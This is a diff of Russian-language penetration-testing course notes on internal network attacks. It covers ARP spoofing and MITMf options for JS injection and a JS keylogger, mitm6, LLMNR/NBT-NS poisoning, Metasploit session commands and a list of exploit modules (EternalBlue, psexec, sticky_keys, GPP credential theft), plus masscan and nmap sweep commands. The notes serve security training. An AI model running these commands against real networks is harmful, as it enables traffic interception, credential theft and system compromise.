@@ -44,7 +44,20 @@ ARP spoofing
 	ettercap -T 10.10.10.10 -X --httpd --proxy-https --proxy
 	arpspoof -i eth0 -t 10.10.10.10
 	Intercepter-NG
+	
+	bettercap	очень интересный и !живой! фреймворк
 
+
+
+MITMF
+	mitmf -i eth0 --spoof --arp --gateway 192.168.1.1
+	--responder		подгружает плагин responder
+	--inject		подгружает плагин инъекции
+	--js-url <url>		инъекция JS на http страницы = XSS (очень полезно, так как внутренние сервисы чато работают без ssl)
+	--smbauth		запуск процесса аутентификации smb
+	--screen 		внедряем код для перехвата страниц http
+	--jskeylogger		внедрение кейлоггера в js
+	
 
 	
 DTP (Dynamic Trunking Protocol) (5%)
@@ -63,7 +76,7 @@ Rogue DHCP (90%)
 В ненастроенной IPv6 сети можно стать роутером
 Этот стандарт дефолтно включен на всех устройствах, более того, в WIndows IPv6 приоритетнее остальных протоколов
 Но это может так-же работать как дос
-	mitm6 -i eth0  	(упрощенная версия, которая не кладе сеть)
+	mitm6 -i eth0  	(упрощенная версия, которая не кладет сеть)
 
 
 
@@ -97,11 +110,15 @@ ICMP
 
 
 NBT-NS/LLMNR  poisoning 
+	Эти протоколы являются проприетарным механизмом резолва хостов в локлаьной сети на L2 без DNS.
+	LLMNR (UDP/5355) 	- multicast
+	NBT-NS			- broadcast	
+
 	Порядок поиска хоста по DNS
 	file "hosts"
 	Cash DNS
 	Request DNS
-	NBT-DNS
+	NBT-NS
 
 
 
@@ -116,6 +133,8 @@ WPAD (98%)
 
 CDP (Cisco Discovery Protocol)
 Раскрывае много информации о девайсе, реальный ip, VLAN, в котором мы находимся
+	
+По адресу оборудования можно определить новые сегменты сетей, которые стить просканироваить
 
 
 
@@ -124,6 +143,9 @@ CDP (Cisco Discovery Protocol)
 Занятие 2
 
 msf
+
+установка на Arch:
+https://miloservdov.org/?p=1891
 
 Auxiliary
 Exploits
@@ -220,6 +242,10 @@ msf6> sessions -c 		Выполнение системной команды
 msf6> sessions -C		Выполнениие команды метерпретера
 msf6> sessions -K		Убить все сессии
 
+msf6> sessions -c "whoami" all	выполнить команду на всех сессиях
+
+
+
 Jobs
 msf6> jobs -l			Список запущенных хендлеров и серверов
 msf6> jobs -K			Убить все задачи
@@ -234,16 +260,47 @@ Loading of other modules (Powershell, Python (если на хосте нет п
 
 
 
+Самые ходовые модули
+auxiliary/scanner/smb/smb_ms17_010
+auxiliary/scanner/smb/smb_login
+auxiliary/scanner/smb/smb_version
+auxiliary/scanner/smb/smb_enumshares
+auxiliary/scanner/ftp/anonymous
+auxiliary/scanner/mssql/mssql_login
+auxiliary/scanner/postgres/postgres_login
+auxiliary/scanner/http/tomcat_mgr_login
+auxiliary/scanner/smb/smb_enum_gpp
+auxiliary/admin/mssql/mssql_exec
+
+exploit/windows/smb/ms17_010_eternalblue
+exploit/windows/smb/ms17_010_psexec
+exploit/windows/smb/psexec
+exploit/linux/samba/is_known_pipename
+post/windows/manage/enable_rdp
+post/windows/gather/enum_termserv
+post/windows/manage/sticky_keys
+post/windows/gather/credentials/gpp
+
+
+
 Masscan (для сканирования очень больших подсетей)
 $ masscan 192.168.0.0/16 -p 1-65535 --rate=9999999 -oX scan_result
 
+
+
 Nmap
-$ nmap -Pn (десктопная внда не отвечает при включенном пинг скане) -n -sV (чаще всего не нужно пр массовом скане) \
---min-rate=400 --min-parallelism=512 (оптимальный параметр подобраный опытным путем) -p 21, 22, 445, 623, 1433, 5432, \
-5555, 8080, 8081, 8180, 8443, 4786, 1099, 27017 --open -oA result -v 192.168.0.0/16
+$ nmap -Pn -n -sV --min-rate=400 --min-parallelism=512 -p 21,22,88,445,623,1433,5432,5555,8080,8081,8180,8443,4786,1099,27017 --open -oA result -v 192.168.0.0/16
+
+-Pn	десктопная винда не отвечает при включенном пинг скане
+-n 	отключаем resolve, что бы сэкономить время 
+-sV 	чаще всего не нужно при массовом скане, экономим время
+--min-rate=400 --min-parallelism=512 оптимальный параметр подобраный опытным путем
+-oA	все типы вывода
+
 
 21 - ftp (если можно подключиться анонмно, это хорошо)
 22 - =)
+88 - 99% контроллер домена (kerberos)
 445 - smb
 623 - ibmi
 1433 - mssql (слабый пароль на учетной записи SA)
@@ -1819,8 +1876,3 @@ youtube.com  лука сафонов 2 лекции по АД
 
 Книга Windows Internals обязательно прочитать!
 22:03 23.04.2021
-
-
-
-Подробный мануал по атакам на Kerberos
-https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
